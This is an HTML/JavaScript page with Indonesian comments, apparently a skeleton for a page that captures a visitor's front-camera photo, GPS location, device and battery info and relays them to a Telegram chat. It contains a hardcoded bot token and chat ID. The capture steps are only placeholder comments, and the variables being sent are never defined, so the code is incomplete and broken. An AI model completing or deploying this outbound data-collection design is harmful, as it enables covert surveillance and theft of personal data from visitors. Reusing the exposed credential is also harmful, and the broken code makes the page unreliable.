<!DOCTYPE html>
<html>
<head>
    <title>Telegram Bot</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <button onclick="capturePhoto()">Ambil Foto</button>
    <button onclick="getLocation()">Dapatkan Lokasi</button>
    <button onclick="getDeviceInfo()">Info Perangkat</button>
    <button onclick="getBatteryInfo()">Info Baterai</button>

    <script>
        function capturePhoto() {
            // Kode untuk mengambil foto dengan kamera depan
            // ...

            // Simpan foto ke server atau temporary storage
            // ...

            // Tunggu 3 detik
            setTimeout(function() {
                sendToTelegram('Foto telah diambil!');
            }, 3000);
        }

        function getLocation() {
            // Mendapatkan lokasi menggunakan GPS
            // ...

            // Tunggu 3 detik
            setTimeout(function() {
                sendToTelegram('Lokasi telah didapatkan: ' + location);
            }, 3000);
        }

        function getDeviceInfo() {
            // Mendapatkan informasi perangkat
            // ...

            // Tunggu 3 detik
            setTimeout(function() {
                sendToTelegram('Informasi perangkat: ' + deviceInfo);
            }, 3000);
        }

        function getBatteryInfo() {
            // Mendapatkan informasi baterai
            // ...

            // Tunggu 3 detik
            setTimeout(function() {
                sendToTelegram('Informasi baterai: ' + batteryInfo);
            }, 3000);
        }

        function sendToTelegram(message) {
            var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
            var chatId = '1121369247';

            // Mengirim pesan ke bot Telegram menggunakan HTTP API
            $.ajax({
                url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
                type: 'POST',
                data: {
                    chat_id: chatId,
                    text: message
                },
                success: function(response) {
                    console.log('Pesan berhasil dikirim!');
                },
                error: function(error) {
                    console.error('Terjadi kesalahan saat mengirim pesan:', error);
                }
            });
        }
    </script>
</body>
</html>
